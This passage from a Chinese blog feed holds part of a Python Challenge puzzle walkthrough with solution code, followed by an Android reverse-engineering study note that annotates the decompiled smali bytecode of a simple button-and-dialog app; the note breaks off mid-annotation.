class="line">def&#160;integrity():&#10;&#160;&#160;&#160;&#160;import&#160;bz2&#10;&#160;&#160;&#160;&#160;un&#160;=&#160;&#39;BZh91AY&#38;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00&#160;\x00!\x9ah3M\x07&#60;]\xc9\x14\xe1BA\x06\xbe\x084&#39;&#10;&#160;&#160;&#160;&#160;pw&#160;=&#160;&#39;BZh91AY&#38;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$&#160;\x00!\x9ah3M\x13&#60;]\xc9\x14\xe1BBP\x91\xf08&#39;&#10;&#160;&#160;&#160;&#160;print&#160;&#34;:&#160;&#34;.join([&#34;username&#34;,&#160;bz2.decompress(un)])&#10;&#160;&#160;&#160;&#160;print&#160;&#34;:&#160;&#34;.join([&#34;password&#34;,&#160;bz2.decompress(pw)])&#10;&#62;&#62;&#62;&#10;&#160;&#160;&#160;&#160;username:&#160;huge&#10;&#160;&#160;&#160;&#160;password:&#160;file</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_9"><a href="http://www.pythonchallenge.com/pc/return/good.html" target="_blank" rel="external">python challenge 9</a></h3><p><code>http://www.pythonchallenge.com/pc/return/good.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9.jpg" alt="9"><br>查看下源码找到最下边注释部分，和8题页面源码部分是不是很相似，应该是绘制图片的RGB值。<br>替换过去试试看，鼠标移动，发现浮现了一头牛的图案。<br>下边通过代码将这个图片完整的绘制出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;good():&#10;&#160;&#160;&#160;&#160;from&#160;PIL&#160;import&#160;Image,&#160;ImageDraw&#10;&#160;&#160;&#160;&#160;im&#160;=&#160;Image.new(&#39;RGB&#39;,&#160;(500,&#160;500))&#10;&#160;&#160;&#160;&#160;draw&#160;=&#160;ImageDraw.Draw(im)&#10;&#10;&#160;&#160;&#160;&#160;headers&#160;=&#160;&#123;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#34;Authorization&#34;:&#160;&#34;Basic&#160;aHVnZTpmaWxl&#34;&#10;&#160;&#160;&#160;&#160;&#125;&#10;&#160;&#160;&#160;&#160;page_source&#160;=&#160;requests.get(&#34;http://www.pythonchallenge.com/pc/return/good.html&#34;,&#160;headers=headers).text&#10;&#160;&#160;&#160;&#160;result&#160;=&#160;re.findall(r&#34;first:\s([\s\S]+)second:\s([\s\S]+)--&#62;&#34;,&#160;page_source)&#10;&#160;&#160;&#160;&#160;if&#160;len(result)&#160;&#62;&#160;0&#160;and&#160;len(result[0])&#160;==&#160;2:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;first,&#160;second&#160;=&#160;result[0][0],&#160;result[0][1]&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;first_points&#160;=&#160;list(eval(first.replace(&#34;\n&#34;,&#160;&#34;&#34;)))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;second_points&#160;=&#160;list(eval(second.replace(&#34;\n&#34;,&#160;&#34;&#34;)))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;i&#160;in&#160;range(0,&#160;len(first_points),&#160;2):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;draw.line(first_points[i:i&#160;+&#160;4],&#160;fill=&#39;white&#39;)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;i&#160;in&#160;range(0,&#160;len(second_points),&#160;2):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;draw.line(second_points[i:i&#160;+&#160;4],&#160;fill=&#39;white&#39;)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;im.save(&#39;img/09.jpg&#39;)</span><br></pre></td></tr></table></figure></p>
<p>最后打印出来：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9-bull.jpg" alt="9-bull"><br>看到牛先想到单词cow，然后进去试试看，发现有新的提示：<br>hmm. it’s a male.<br>那就是公牛喽，换成bull,成功。</p>
<h3 id="python_challenge_10"><a href="http://www.pythonchallenge.com/pc/return/bull.html" target="_blank" rel="external">python challenge 10</a></h3><p><code>http://www.pythonchallenge.com/pc/return/bull.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-10.jpg" alt="10"><br>这个题的图片赫然就是我们绘制的那头牛哇，感觉萌萌哒。<br>看下边len(a[30])=? 要知道这个答案，肯定要得到a这个序列。<br>查看下页面源码，点开里边的sequence.txt内容为(点击牛也会跳出)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#160;=&#160;[1,&#160;11,&#160;21,&#160;1211,&#160;111221,</span><br></pre></td></tr></table></figure></p>
<p>显然，要得到的答案就是这里了，下边找规律吧。</p>
<table>
<thead>
<tr>
<th>index</th>
<th style="text-align:left">look</th>
<th style="text-align:left">say</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td style="text-align:left"></td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td>1</td>
<td style="text-align:left">第0项有 1个1</td>
<td style="text-align:left">11</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:left">第1项有 2个1</td>
<td style="text-align:left">21</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:left">第2项有 1个2 1个1</td>
<td style="text-align:left">1211</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:left">第3项有 1个1 1个2 2个1</td>
<td style="text-align:left">111221</td>
</tr>
<tr>
<td>5</td>
<td style="text-align:left">…</td>
<td style="text-align:left">…</td>
</tr>
</tbody>
</table>
<p>规律找到，编写代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;bull():&#10;&#10;&#160;&#160;&#160;&#160;def&#160;get_next_item(str_item=&#34;&#34;):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;item&#160;=&#160;[]&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;len(str_item)&#160;==&#160;0:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;item.append(&#34;1&#34;)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;elif&#160;len(str_item)&#160;&#62;&#160;0:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cur_list&#160;=&#160;list(str_item)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;same_count&#160;=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;len(cur_list)&#160;==&#160;1:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;item.append(&#34;&#34;.join([str(same_count),&#160;cur_list[0]]))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;elif&#160;len(cur_list)&#160;&#62;&#160;1:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;i&#160;in&#160;range(len(cur_list)):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;i&#160;+&#160;1&#160;&#62;=&#160;len(cur_list):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;item.append(&#34;&#34;.join([str(same_count),&#160;cur_list[i]]))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;elif&#160;i&#160;+&#160;1&#160;&#60;&#160;len(cur_list):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;cur_list[i]&#160;==&#160;cur_list[i+1]:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;same_count&#160;+=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;else:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;item.append(&#34;&#34;.join([str(same_count),&#160;cur_list[i]]))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;same_count&#160;=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;&#34;&#34;.join(item)&#10;&#10;&#160;&#160;&#160;&#160;index&#160;=&#160;0&#10;&#160;&#160;&#160;&#160;cur_item&#160;=&#160;&#34;&#34;&#10;&#160;&#160;&#160;&#160;while&#160;index&#160;&#60;&#160;31:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cur_item&#160;=&#160;get_next_item(cur_item)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;index&#160;+=&#160;1&#10;&#160;&#160;&#160;&#160;print&#160;&#34;len(a[%d])&#160;=&#160;%d&#34;&#160;%&#160;(index-1,&#160;len(cur_item))&#10;&#160;&#160;&#160;&#160;&#10;&#62;&#62;&#62;&#160;len(a[30])&#160;=&#160;5808</span><br></pre></td></tr></table></figure></p>
<p>网上看下别人的答案，找到一种更简单的实现方式，调用groupby函数，一行代码即可实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;bull_ex():&#10;&#160;&#160;&#160;&#160;from&#160;itertools&#160;import&#160;groupby&#10;&#160;&#160;&#160;&#160;a&#160;=&#160;&#39;1&#39;&#10;&#160;&#160;&#160;&#160;for&#160;i&#160;in&#160;range(30):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;a&#160;=&#160;&#39;&#39;.join(str(len(list(v)))&#160;+&#160;k&#160;for&#160;k,&#160;v&#160;in&#160;groupby(a))&#10;&#160;&#160;&#160;&#160;print&#160;len(a)</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="ex]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓逆向学习笔记-ClickButton]]></title>
    <link href="http://blog.idhyt.xyz/2015/05/11/4-android-reverse-clickbutton/"/>
    <id>http://blog.idhyt.xyz/2015/05/11/4-android-reverse-clickbutton/</id>
    <published>2015-05-11T09:45:11.000Z</published>
    <updated>2015-12-27T08:55:44.000Z</updated>
    <content type="html"><![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Override&#10;protected void onCreate(Bundle savedInstanceState) &#123;&#10;    super.onCreate(savedInstanceState);&#10;    setContentView(R.layout.activity_click_button);&#10;    Button button = (Button)findViewById(R.id.click_me);&#10;    button.setOnClickListener(new View.OnClickListener() &#123;&#10;        @Override&#10;        public void onClick(View v) &#123;&#10;            AlertDialog.Builder alert = new AlertDialog.Builder(ClickButton.this);&#10;            alert.setTitle(&#34;hello world&#34;);&#10;            alert.setPositiveButton(&#34;exit&#34;, new DialogInterface.OnClickListener() &#123;&#10;                @Override&#10;                public void onClick(DialogInterface dialog, int which) &#123;&#10;                    dialog.dismiss();&#10;                    ClickButton.this.finish();&#10;                &#125;&#10;            &#125;);&#10;            alert.show();&#10;        &#125;&#10;    &#125;);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>点击 - 弹窗 - 退出, 功能如下图所示：</p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_1.png" alt=""></p>
<p>xml布局</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;RelativeLayout xmlns:android=&#34;http://schemas.android.com/apk/res/android&#34;&#10;    xmlns:tools=&#34;http://schemas.android.com/tools&#34; android:layout_width=&#34;match_parent&#34;&#10;    android:layout_height=&#34;match_parent&#34; android:paddingLeft=&#34;@dimen/activity_horizontal_margin&#34;&#10;    android:paddingRight=&#34;@dimen/activity_horizontal_margin&#34;&#10;    android:paddingTop=&#34;@dimen/activity_vertical_margin&#34;&#10;    android:paddingBottom=&#34;@dimen/activity_vertical_margin&#34; tools:context=&#34;.HelloWorld&#34;&#62;&#10;    &#60;TextView&#10;        android:text=&#34;@string/hello_world&#34;&#10;        android:layout_width=&#34;wrap_content&#34;&#10;        android:layout_height=&#34;wrap_content&#34;&#10;        android:id=&#34;@+id/textView&#34; /&#62;&#10;    &#60;Button&#10;        android:id = &#34;@+id/click_me&#34;&#10;        android:text=&#34;@string/click_me&#34;&#10;        android:layout_width=&#34;wrap_content&#34;&#10;        android:layout_height=&#34;wrap_content&#34;&#10;        android:layout_below=&#34;@+id/textView&#34; /&#62;&#10;&#60;/RelativeLayout&#62;</span><br></pre></td></tr></table></figure>
<h2 id="反编译">反编译</h2><p>apktool反编译成smali文件或者直接用apkIDE(apk改之理)打开，会自动进行反编译，如下图所示<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_2.png" alt=""></p>
<p>主要看主类ClickButton.smali，还有ClickButton$1.smali, ClickButton$1$1.smali两个文件。<br>这两个文件是匿名内部类的Smali代码，由于没有名字，所以编译后只能用$XXX来区分。</p>
<h2 id="逆向分析">逆向分析</h2><h3 id="主类文件头部分">主类文件头部分</h3><p>1-3行定义的是基本信息，参照着前边的源码，很容易对应起来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.class public Lcom/reverse/idhyt/androidreverse/ClickButton;&#10;.super Landroid/app/Activity;&#10;.source &#34;ClickButton.java&#34;</span><br></pre></td></tr></table></figure>
<p>这是一个由ClickButton.java编译得到的smali文件（第3行），<br>它是com.reverse.idhyt.androidreverse这个package下的一个类（第1行），<br>继承自android.app.Activity，即父类为android.app.Activity（第2行）</p>
<h3 id="定位入口函数">定位入口函数</h3><p>找到onCreate函数，定位启动代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods&#10;.method protected onCreate(Landroid/os/Bundle;)V&#10;    .locals 2&#10;    .param p1, &#34;savedInstanceState&#34;    # Landroid/os/Bundle;&#10;    .prologue&#10;    .line 18&#10;    invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&#62;onCreate(Landroid/os/Bundle;)V&#10;    .line 19&#10;    const v1, 0x7f040017&#10;    invoke-virtual &#123;p0, v1&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton;-&#62;setContentView(I)V&#10;    .line 20&#10;    const v1, 0x7f090040&#10;    invoke-virtual &#123;p0, v1&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton;-&#62;findViewById(I)Landroid/view/View;&#10;    move-result-object v0&#10;    check-cast v0, Landroid/widget/Button;&#10;    .line 21&#10;    .local v0, &#34;button&#34;:Landroid/widget/Button;&#10;    new-instance v1, Lcom/reverse/idhyt/androidreverse/ClickButton$1;&#10;    invoke-direct &#123;v1, p0&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton$1;-&#62;&#60;init&#62;(Lcom/reverse/idhyt/androidreverse/ClickButton;)V&#10;    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/Button;-&#62;setOnClickListener(Landroid/view/View$OnClickListener;)V&#10;    .line 36&#10;    return-void&#10;.end method</span><br></pre></td></tr></table></figure>
<h3 id="翻译smali代码">翻译smali代码</h3><p>第1行：</p>
<pre><code><span class="preprocessor"># virtual methods 注释后是虚方法</span>
</code></pre><p>第2行：</p>
<pre><code>.<span class="keyword">method</span> protected onCreate(<span class="type">Landroid</span>/os/<span class="type">Bundle</span>;)V
</code></pre><p>这里先简单了解一下alvik字节码，详细参考：<a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">dalvik_opcodes</a></p>
<p>alvik字节码有类型两种，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。</p>
<pre><code>V    <span class="keyword">void</span>，只能用于返回值类型
Z    <span class="keyword">boolean</span>
B    <span class="keyword">byte</span>
S    <span class="keyword">short</span>
C    <span class="keyword">char</span>
I    <span class="keyword">int</span>
J    <span class="keyword">long</span>（<span class="number">64</span>位）
F    <span class="keyword">float</span>
D    <span class="keyword">double</span>(<span class="number">64</span>位)
</code></pre><p>对象以Lpackage/name/ObjectName;的表示形式。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。</p>
<p>了解了这些再看第2行代码：<br>onCreate函数参数为一个对象类型，对象名为Bundle， 该对象所在的包为android/os，对应java中android.os.Bundle</p>
<p>第3行：</p>
<pre><code><span class="class">.locals</span> <span class="number">2</span>
</code></pre><p>标明了你在这个函数中最少要用到的本地寄存器的个数为2，即指定了使用的局部变量的个数</p>
<p>第4行：</p>
<pre><code>.<span class="built_in">param</span> p1, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
</code></pre><p>“.parameter”指定了方法的参数，每个”.parameter”指令表明使用一个参数，比如方法中有使用到3个参数，那么就会出现3条“.parameter”指令。</p>
<p>第6-7行：</p>
<pre><code>“<span class="class">.prologue</span>” <span class="class">.line</span>
</code></pre><p>“.prologue”指定了代码的开始处，混淆过的代码可能去掉了该指令。<br>“.line”指定了该处指令在源代码中的行号，同样的，混淆过的代码可能去除了行号信息。</p>
<p>第8行：</p>
<pre><code>invoke-<span class="keyword">super</span> {p0, p1}, Landroid<span class="regexp">/app/</span>Activity;-&gt;onCreate(Landroid<span class="regexp">/os/</span>Bundle;)V
</code></pre><p>这里先了解一下寄存器和函数调用方法</p>
<h4 id="寄存器">寄存器</h4><p>在smali里的所有操作都必须经过寄存器来进行</p>
<p>本地寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、…<br>参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2、…<br>特别注意的是，p0不一定是函数中的第一个参数<br>在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2代表函数中的第二个参数…<br>而在static函数中p0才对应第一个参数（因为Java的static方法中没有this方法）<br>本地寄存器没有限制，理论上是可以任意使用的。</p>
<p>再看代码，这里寄存器p1 = “savedInstanceState”，后边将用作传参</p>
<h4 id="函数">函数</h4><p>smali中的函数和成员变量一样也分为两种类型，但是不同成员变量中的static和instance之分，而是direct和virtual之分。<br>那么direct method和virtual method有什么区别呢？直白地讲，direct method就是private函数，其余的public和protected函数都属于virtual method。</p>
<p>表示形式</p>
<pre><code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z
Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（在此是<span class="number">3</span>个整型参数），Z是返回类型（<span class="keyword">bool</span>型）。
方法的参数是一个接一个的，中间没有隔开。
</code></pre><p>调用方式</p>
<p>调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。<br>当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。<br>invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数this指针。<br>invoke-super：调用父类方法用的指令，在onCreate、onDestroy等方法都能看到。<br>invoke-direct：调用private函数的。<br>invoke-virtual：用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static<br>invoke-xxxxx/range：当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”</p>
<p>再看代码，调用父类android.app.Activity的onCreate方法，参数为p1 = “savedInstanceState” 类型为android.os.Bundle，返回类型为void型，其中p0为this指针</p>
<h2 id="完整注释">完整注释</h2><p>主类代码详细注释如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods&#10;.method protected onCreate(Landroid/os/Bundle;)V&#10;    .locals 2&#10;    # &#26631;&#26126;&#20102;&#20320;&#22312;&#36825;&#20010;&#20989;&#25968;&#20013;&#26368;&#23569;&#35201;&#29992;&#21040;&#30340;&#26412;&#22320;&#23492;&#23384;&#22120;&#30340;&#20010;&#25968;&#10;    .param p1, &#34;savedInstanceState&#34;    # Landroid/os/Bundle;&#10;    # &#25351;&#23450;&#20102;&#26041;&#27861;&#30340;&#21442;&#25968;&#10;    .prologue&#10;    # &#20195;&#30721;&#30340;&#24320;&#22987;&#22788;&#10;    .line 18&#10;    # &#35813;&#22788;&#25351;&#20196;&#22312;&#28304;&#20195;&#30721;&#20013;&#30340;&#34892;&#21495;&#10;    invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&#62;onCreate(Landroid/os/Bundle;)V&#10;    # &#35843;&#29992;&#29238;&#31867;android.app.Activity&#30340;onCreate&#26041;&#27861;&#65292;&#21442;&#25968;&#20026;p1 = &#34;savedInstanceState&#34; &#31867;&#22411;&#20026;android.os.Bundle, &#36820;&#22238;&#31867;&#22411;&#20026;void&#22411;&#12290;&#20854;&#20013;p0&#20026;this&#24341;&#29992;&#10;    .line 19&#10;    const v1, 0x7f040017&#10;    # &#20351;&#29992;&#20102;v1&#26412;&#22320;&#23492;&#23384;&#22120;&#65292;&#24182;&#25226;&#20540;0x7f040017&#23384;&#21040;v1&#20013;&#10;    invoke-virtual &#123;p0, v1&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton;-&#62;setContentView(I)V&#10;    # &#35843;&#29992;&#20102;public com.reverse.idhyt.androidreverse.ClickButton&#30340;setContentView&#26041;&#27861;&#65292; &#21442;&#25968;&#20026;v1 = 0x7f040017(&#21442;&#32771;&#28304;&#30721;&#21487;&#30693;&#35813;&#20540;&#34920;&#31034;&#24067;&#23616;&#25991;&#20214;), &#36820;&#22238;&#31867;&#22411;&#20026;void&#22411;&#10;    .line 20&#10;    const v1, 0x7f090040&#10;    # &#20351;&#29992;&#20102;v1&#26412;&#22320;&#23492;&#23384;&#22120;&#65292;&#24182;&#25226;&#20540;0x7f090040&#23384;&#21040;v1&#20013;&#10;    invoke-virtual &#123;p0, v1&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton;-&#62;findViewById(I)Landroid/view/View;&#10;    # &#35843;&#29992;&#20102;public com.reverse.idhyt.androidreverse.ClickButton&#30340;findViewById&#26041;&#27861;&#65292; &#21442;&#25968;&#20026;v1 = 0x7f090040(&#21442;&#32771;&#28304;&#30721;&#21487;&#30693;&#35813;&#20540;&#34920;&#31034;&#19968;&#20010;button&#25353;&#38062;), &#36820;&#22238;&#31867;&#22411;&#20026;void&#22411;&#10;    move-result-object v0&#10;    # &#23558;findViewById&#30340;&#36820;&#22238;&#23545;&#35937;&#23384;&#20837;&#23492;&#23384;&#22120;v0&#20013;&#65292;&#29992;&#27861;&#21442;&#32771;-&#62;&#20989;&#25968;&#36820;&#22238;&#32467;&#26524;&#10;    check-cast v0, Landroid/widget/Button;&#10;    # &#26816;&#27979;v0&#30340;&#23545;&#35937;&#24341;&#29992;&#26159;&#21542;&#21487;&#23454;&#20363;&#21270;&#10;    # Dalvik opcodes &#10;    # Opcode name: check-cast vx, type_id&#10;    # Explanation: Checks whether the object reference in vx can be cast to an instance of a class referenced by type_id. Throws ClassCastException if the cast is not possible, continues execution otherwise.&#10;    .line 21&#10;    .local v0, &#34;button&#34;:Landroid/widget/Button;&#10;    # v0 = &#34;button&#34;(&#28304;&#30721;&#20013;&#23450;&#20041;&#30340;&#21464;&#37327;&#21517;) &#31867;&#22411; android/widget/Button&#10;    new-instance v1, Lcom/reverse/idhyt/androidreverse/ClickButton$1;&#10;    # &#21019;&#24314;&#31867;&#23454;&#20363; vi = com.reverse.idhyt.androidreverse.ClickButton$1 &#21363;&#31867;ClickButton$1&#23454;&#20363;&#21270;&#10;    invoke-direct &#123;v1, p0&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton$1;-&#62;&#60;init&#62;(Lcom/reverse/idhyt/androidreverse/ClickButton;)V&#10;    # &#35843;&#29992;&#31867;ClickButton$1&#30340;private&#20989;&#25968;init, &#21442;&#25968;&#20026;p0 &#31867;&#22411;&#20026;com.reverse.idhyt.androidreverse.ClickButton, &#20854;&#20013;v1&#20026;&#31867;&#23545;&#35937;&#26412;&#36523;&#65292;&#21363;this&#10;    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/Button;-&#62;setOnClickListener(Landroid/view/View$OnClickListener;)V&#10;    # &#35843;&#29992;&#31867;android.widget.Button&#20013;&#23450;&#20041;&#30340;&#19968;&#20010;pravite&#20989;&#25968;setOnClickListener&#10;    # &#21442;&#25968;v0&#20026;android.widget.Button, v1&#20026;&#20256;&#36882;&#32473;setOnClickListener&#26041;&#27861;&#30340;Landroid/view/View$OnClickListener&#21442;&#25968;&#10;    # &#21363;&#20026;button&#25353;&#38062;&#28155;&#21152;&#20102;&#19968;&#20010;&#28857;&#20987;&#30417;&#21548;&#20107;&#20214;&#65292;&#20854;&#23454;&#29616;&#20195;&#30721;&#22312;v1 = ClickButton$1&#20013;</span><br></pre></td></tr></table></figure>
<p>button点击事件代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods&#10;.method public onClick(Landroid/view/View;)V&#10;    .locals 3&#10;    .param p1, &#34;v&#34;    # Landroid/view/View;&#10;    .prologue&#10;    .line 24&#10;    new-instance v0, Landroid/app/AlertDialog$Builder;&#10;    # v0 = this &#23545;&#29031;&#28304;&#30721;&#65306;new AlertDialog.Builder()&#10;    iget-object v1, p0, Lcom/reverse/idhyt/androidreverse/ClickButton$1;-&#62;this$0:Lcom/reverse/idhyt/androidreverse/ClickButton;&#10;    # &#35843;&#29992;&#23545;&#35937; ClickButton.this &#23545;&#29031;&#28304;&#30721; new AlertDialog.Builder(ClickButton.this)&#10;    invoke-direct &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&#62;&#60;init&#62;(Landroid/content/Context;)V&#10;    # &#21021;&#22987;&#21270;Context&#10;    .line 25&#10;    .local v0, &#34;alert&#34;:Landroid/app/AlertDialog$Builder;&#10;    # v0 = &#34;alert&#34; &#31867;&#22411;&#65306;android/app/AlertDialog$Builder&#10;    const-string v1, &#34;hello world&#34;&#10;    # v1 = &#34;hello world&#34;&#10;    invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&#62;setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;&#10;    # &#35843;&#29992;v0&#30340;setTitle&#26041;&#27861;&#65292;&#36820;&#22238;&#31867;&#22411;&#20026;android/app/AlertDialog$Builder&#65292;&#23545;&#24212;&#28304;&#30721;alert.setTitle(&#34;hello world&#34;)&#10;    .line 26&#10;    const-string v1, &#34;exit&#34;&#10;    # v1 = &#34;exit&#34;&#10;    new-instance v2, Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;&#10;    # &#37325;&#26032;&#23454;&#20363;&#21270;&#19968;&#20010;clickButton&#31867;&#10;    invoke-direct &#123;v2, p0&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;-&#62;&#60;init&#62;(Lcom/reverse/idhyt/androidreverse/ClickButton$1;)V&#10;    # ClickButton$1$1&#21021;&#22987;&#21270;&#65292;&#20854;&#29238;&#31867;&#20026;ClickButton$1&#10;    invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&#62;setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;&#10;    # &#35843;&#29992;v0&#30340;setPositiveButton&#26041;&#27861;&#65292;&#21442;&#25968;&#20026;v1, v2, v1 =&#34;exit&#34;, v2 = DialogInterface$OnClickListener,&#21363;&#22312;exit&#25353;&#38062;&#19978;&#28155;&#21152;&#20102;&#19968;&#20010;&#30417;&#21548;&#20107;&#20214;v2:ClickButton$1$1&#10;    .line 33&#10;    invoke-virtual &#123;v0&#125;, Landroid/app/AlertDialog$Builder;-&#62;show()Landroid/app/AlertDialog;&#10;    # 